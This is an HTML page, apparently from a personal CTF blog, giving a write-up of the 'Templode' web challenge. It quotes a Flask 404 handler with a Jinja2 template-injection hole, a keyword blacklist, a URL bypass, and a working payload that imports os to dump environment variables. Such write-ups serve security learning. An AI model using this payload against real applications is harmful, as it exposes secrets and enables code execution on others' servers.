@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOFLAKY - Templode Writeup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0c0c0c;
+            color: #fff;
+            line-height: 1.6;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 2rem;
+            background: #0c0c0c;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .logo {
+            color: #fff;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+
+        nav a:hover {
+            background-color: #7D5DE6;
+        }
+
+        .writeup-container {
+            max-width: 800px;
+            margin: 4rem auto;
+            padding: 0 1rem;
+        }
+
+        .writeup-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .writeup-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .challenge-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+        }
+
+        .category {
+            background: #7D5DE6;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+        }
+
+        .diff {
+            color: #FFC600;
+            font-weight: bold;
+        }
+
+        .writeup-content {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 2rem;
+        }
+
+        .section {
+            margin-bottom: 2rem;
+        }
+
+        .section:last-child {
+            margin-bottom: 0;
+        }
+
+        .section h2 {
+            color: #7D5DE6;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .flag {
+            display: inline-block;
+            background: #2a2a2a;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 1.1rem;
+        }
+
+        /* VS Code-like styling for code blocks */
+        pre.code {
+            display: block;
+            background: #1E1E1E;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            margin: 1rem 0;
+            overflow-x: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid #333;
+        }
+        
+        .code-bar {
+            display: flex;
+            justify-content: space-between;
+            background: #252526;
+            padding: 0.5rem 1rem;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+            border-bottom: 1px solid #333;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 0.8rem;
+        }
+        
+        .code-bar .file-name {
+            color: #CCCCCC;
+        }
+        
+        .code-bar .language {
+            color: #858585;
+        }
+        
+        .code-content {
+            padding: 1rem;
+        }
+        
+        /* Syntax highlighting */
+        .keyword {
+            color: #569CD6;
+        }
+        
+        .function {
+            color: #DCDCAA;
+        }
+        
+        .variable {
+            color: #9CDCFE;
+        }
+        
+        .string {
+            color: #CE9178;
+        }
+        
+        .comment {
+            color: #6A9955;
+        }
+        
+        .operator {
+            color: #D4D4D4;
+        }
+        
+        .bracket {
+            color: #D4D4D4;
+        }
+        
+        .parameter {
+            color: #9CDCFE;
+        }
+
+        .challenge-files {
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .challenge-files h2 {
+            color: #7D5DE6;
+            font-size: 1.5rem;
+        }
+
+        .challenge-files a {
+            color: #7D5DE6;
+            text-decoration: none;
+            padding: 5px;
+            background: #333;
+            border-radius: 5px;
+            transition: background 0.3s;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .challenge-files a:hover {
+            background: #5e3dbf;
+        }
+        
+        code.inline {
+            display: inline;
+            padding: 0.2rem 0.4rem;
+            background: #333;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        .url {
+            word-break: break-all;
+        }
+
+        @media (max-width: 768px) {
+            .writeup-container {
+                margin: 2rem auto;
+            }
+            
+            .writeup-header h1 {
+                font-size: 2rem;
+            }
+            
+            .writeup-content {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="index.html" class="logo">SOFLAKY</a>
+        <nav>
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="writeups.html">Writeups</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article class="writeup-container">
+            <header class="writeup-header">
+                <h1>Templode</h1>
+                <div class="challenge-meta">
+                    <span class="category">Web</span>
+                    <span class="diff">Hard</span>
+                </div>
+            </header>
+            <section class="writeup-content">
+                <div class="section">
+                    <h2>Description</h2>
+                    <p>"We don't trust any URL shortener, so we decided to make our own."</p>
+                </div>
+
+                <section class="challenge-files">
+                    <h2>Challenge Files</h2>
+                    <a href="challenge.zip" download="challenge.zip">Download challenge.zip</a>
+                </section>
+
+                <div class="section">
+                    <h2>Finding the SSTI Vulnerability</h2>
+                    <p>I started by looking through <code class="inline">app.py</code>, and one thing caught my attention—the <strong>404 error handler</strong>:</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">app.py</span>
+                            <span class="language">Python</span>
+                        </div>
+                        <pre class="code"><span class="decorator">@app</span><span class="operator">.</span><span class="function">errorhandler</span><span class="bracket">(</span><span class="number">404</span><span class="bracket">)</span>
+<span class="keyword">def</span> <span class="function">page_not_found</span><span class="bracket">(</span><span class="parameter">e</span><span class="bracket">)</span><span class="operator">:</span>
+    <span class="variable">path</span> <span class="operator">=</span> <span class="variable">request</span><span class="operator">.</span><span class="variable">path</span><span class="operator">.</span><span class="function">lstrip</span><span class="bracket">(</span><span class="string">'/'</span><span class="bracket">)</span>
+    <span class="variable">template</span> <span class="operator">=</span> <span class="string">'''
+    &lt;h1&gt;404 - Page Not Found&lt;/h1&gt;
+    &lt;p&gt;The requested URL /'''</span> <span class="operator">+</span> <span class="variable">path</span> <span class="operator">+</span> <span class="string">''' was not found on this server.&lt;/p&gt;
+    &lt;p&gt;Please check the URL or go back to the &lt;a href="/"&gt;homepage&lt;/a&gt;.&lt;/p&gt;
+    '''</span>
+    <span class="keyword">return</span> <span class="function">render_template_string</span><span class="bracket">(</span><span class="variable">template</span><span class="bracket">)</span><span class="operator">,</span> <span class="number">404</span></pre>
+                    </div>
+                    
+                    <p>I immediately recognized the issue here. The function takes <code class="inline">path</code>, which comes directly from the URL, and injects it into <code class="inline">render_template_string()</code>. This is a <strong>Server-Side Template Injection (SSTI) vulnerability</strong>, meaning I could inject Jinja2 expressions and execute arbitrary code.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Bypassing the Blacklist</h2>
+                    <p>Before jumping into exploitation, I checked <code class="inline">redirect_url()</code>, which had a blacklist blocking certain keywords:</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">app.py</span>
+                            <span class="language">Python</span>
+                        </div>
+                        <pre class="code"><span class="variable">blacklist</span> <span class="operator">=</span> <span class="bracket">[</span><span class="string">'{{''</span><span class="operator">,</span> <span class="string">'class'</span><span class="operator">,</span> <span class="string">'attr'</span><span class="operator">,</span> <span class="string">'mro'</span><span class="operator">,</span> <span class="string">'['</span><span class="operator">,</span> <span class="string">'import'</span><span class="operator">,</span> <span class="string">'os'</span><span class="operator">,</span> <span class="string">'system'</span><span class="operator">,</span> <span class="string">'subclasses'</span><span class="operator">,</span> <span class="string">'mro'</span><span class="operator">,</span> <span class="string">'request'</span><span class="operator">,</span> <span class="string">'args'</span><span class="operator">,</span> <span class="string">'eval'</span><span class="operator">,</span> <span class="string">'exec'</span><span class="bracket">]</span></pre>
+                    </div>
+                    
+                    <p>At first, it seemed restrictive, but then I discovered a <strong>bypass</strong>—if I used a <strong>multi-segment URL</strong> like <code class="inline">/aa/payload</code>, I could slip through.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Exploiting the Vulnerability</h2>
+                    <p>I tried simple SSTI payloads like <code class="inline">{{ 7 * 7 }}</code>, but they were blocked, returning either a 404 or 400. Instead of manually testing each payload, I used an <strong>automated payload-fuzzing tool</strong>:</p>
+                    <p>🔗 <a href="https://www.ddosi.org/fenjing/" style="color: #7D5DE6;">https://www.ddosi.org/fenjing/</a></p>
+                    <p>Eventually, I found a <strong>working payload</strong> that allowed me to dump environment variables:</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">URL</span>
+                        </div>
+                        <pre class="code url">http://aa5bc6827feebb365d40a.playat.flagyard.com/aaa/%7B%7B((lipsum.__globals__.__builtins__.__import__('os')).environ)%7D%7D</pre>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Understanding the Payload</h2>
+                    <p>The decoded payload has multiple components working together:</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">Decoded Payload</span>
+                            <span class="language">Jinja2</span>
+                        </div>
+                        <pre class="code"><span class="bracket">{{</span> <span class="bracket">((</span><span class="variable">lipsum</span><span class="operator">.</span><span class="variable">__globals__</span><span class="operator">.</span><span class="variable">__builtins__</span><span class="operator">.</span><span class="function">__import__</span><span class="bracket">(</span><span class="string">'os'</span><span class="bracket">))</span><span class="operator">.</span><span class="variable">environ</span><span class="bracket">)</span> <span class="bracket">}}</span></pre>
+                    </div>
+                    
+                    <ul style="margin-left: 2rem; margin-top: 1rem;">
+                        <li><code class="inline">lipsum.__globals__</code> → Accesses global variables in Jinja2.</li>
+                        <li><code class="inline">.__builtins__</code> → Gives access to Python built-in functions.</li>
+                        <li><code class="inline">.__import__('os')</code> → Imports the <code class="inline">os</code> module.</li>
+                        <li><code class="inline">.environ</code> → Dumps <strong>environment variables</strong>, where the <strong>flag</strong> was stored.</li>
+                    </ul>
+                    <p>This successfully printed the flag from the environment variables.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Flag</h2>
+                    <code class="flag">FlagY{************}</code>
+                </div>
+            </section>
+        </article>
+    </main>
+</body>
+</html>
